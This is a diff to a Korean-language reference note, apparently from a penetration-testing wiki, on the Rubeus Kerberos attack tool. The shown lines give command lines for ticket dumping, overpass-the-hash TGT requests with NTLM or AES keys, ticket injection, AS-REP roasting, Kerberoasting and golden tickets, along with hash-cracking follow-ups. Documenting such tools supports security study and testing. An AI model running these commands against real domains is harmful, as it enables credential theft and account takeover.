@@ -31,17 +31,21 @@ Rubeus.exe <command> [options]
 
 ## 대표 예시
 
-### 현재 세션의 Kerberos ticket 덤프
+### 현재 또는 지정 로그온 세션의 Kerberos ticket 덤프
 
 ```cmd
 Rubeus.exe dump /nowrap
 ```
 
-### hash/key로 TGT 요청 후 바로 주입
+비상승 실행은 현재 사용자의 service ticket을 중심으로 반환하며 TGT session key가 없어 재사용할 수 없는 결과가 포함될 수 있다. 상승된 실행은 모든 로그온 세션의 TGT·service ticket을 열거할 수 있으므로 필요하면 `/luid:<LOGON_LUID>`와 `/service:krbtgt`로 범위를 제한하고 `UserName`, `LogonId`, `ServiceName`, 유효 시간과 Base64 ticket을 대응시킨다.
+
+### hash/key로 전용 로그온 세션에 TGT 요청
 
 ```cmd
-Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NTLM_HASH> /ptt
+Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /createnetonly:"C:\Windows\System32\cmd.exe" /show
 ```
+
+현재 upstream의 `/createnetonly` 경로는 Type 9 process를 만들고 ticket을 그 로그온 세션에 적용하며 PID·LUID를 반환한다. 공유 로그온 세션의 기존 TGT를 덮을 수 있는 `/ptt` 직접 주입보다 전용 process를 우선하고 정리는 [[OverPass the Hash]]를 따른다.
 
 
 ### AS-REP roast hash 수집
@@ -65,13 +69,15 @@ Rubeus.exe kerberoast /user:<SPN_USER> /nowrap /outfile:<KERBEROAST_HASH_FILE>
 
 | 명령·옵션 | 의미 | 사용하는 상황 |
 |---|---|---|
-| `dump` | 현재 세션의 ticket 출력 | 기존 TGT/TGS 확인 |
+| `dump` | 비상승이면 현재 사용자, 상승이면 모든 로그온 세션의 ticket 출력 | 기존 TGT/TGS 확인·범위 제한 |
 | `asktgt` | key 또는 hash로 TGT 요청 | OverPass the Hash |
 | `ptt` | ticket을 logon session에 주입 | Pass the Ticket |
 | `asreproast` | pre-auth 미요구 계정의 AS-REP hash 요청 | AS-REP Roasting |
 | `kerberoast` | SPN 계정의 TGS hash 요청 | Kerberoasting |
 | `golden` | 보유한 `krbtgt` key로 TGT 생성 | Golden Ticket과 ExtraSids 경로 |
 | `createnetonly` | 별도 netonly logon session 생성 | 기존 세션과 ticket context 분리 |
+| `/luid:<LUID>` | 상승된 컨텍스트에서 특정 로그온 세션을 조회·주입·purge 대상으로 지정 | 다른 세션의 ticket과 범위 분리 |
+| `/service:krbtgt` | `dump` 결과를 TGT로 제한 | 전체 ticket 수집 범위 축소 |
 | `/user`, `/domain` | 사용자와 도메인 지정 | TGT와 roast 요청 |
 | `/rc4`, `/aes128`, `/aes256` | Kerberos key 지정 | `asktgt` |
 | `/ticket`, `/ptt` | ticket 입력 또는 즉시 주입 | ticket 재사용 |
@@ -86,7 +92,7 @@ Rubeus.exe kerberoast /user:<SPN_USER> /nowrap /outfile:<KERBEROAST_HASH_FILE>
 
 | 출력/상태 | 의미 | 다음 행동 |
 |---|---|---|
-| TGT/TGS 출력 또는 base64 ticket | Kerberos ticket 확보 | `.kirbi` 저장, `ptt`, `klist`로 주입/확인 |
+| TGT/TGS 출력 또는 base64 ticket | 출력에 표시된 ticket 자료 확보 | principal·SPN·유효 시간과 session key 포함 여부를 확인한 뒤 `.kirbi` 저장·주입 검토 |
 | AS-REP/Kerberoast hash 출력 | 오프라인 cracking 대상 확보 | John/Hashcat mode 확인 후 cracking |
 | `KRB_AP_ERR` / preauth / clock skew 오류 | Kerberos 조건 불일치 | 시간 동기화, SPN, 계정 속성, realm 확인 |
 | `ptt` 성공 | 현재 세션에 ticket 주입 | 대상 서비스 접근으로 인증 여부 확인 |
